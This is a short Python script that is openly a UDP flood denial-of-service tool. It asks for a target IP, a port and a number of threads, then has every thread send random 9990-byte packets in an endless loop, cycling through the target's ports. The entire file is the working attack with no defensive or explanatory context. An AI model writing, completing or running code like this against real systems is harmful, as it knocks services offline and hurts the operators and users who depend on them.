import sys
import os
import time
import socket
import random
from threading import Thread

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9990)


os.system("clear")
os.system("figlet Attack Starting")

os.system("clear")

ip = input("IP Target : ")
port = int(input("Port       : "))
threads = int(input("Enter No. of Threads to spawn:"))

print("Starting Attack :")

def ddos(ip, port, thread_id):
  sent = 0
  while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print(f"Sent {sent} packet to {ip} throught port:{port} from Thread {thread_id}")
      if port == 65534:
        port = 1

for thread_id in range(threads):
  Thread(target=ddos, args=(ip, port, thread_id)).start()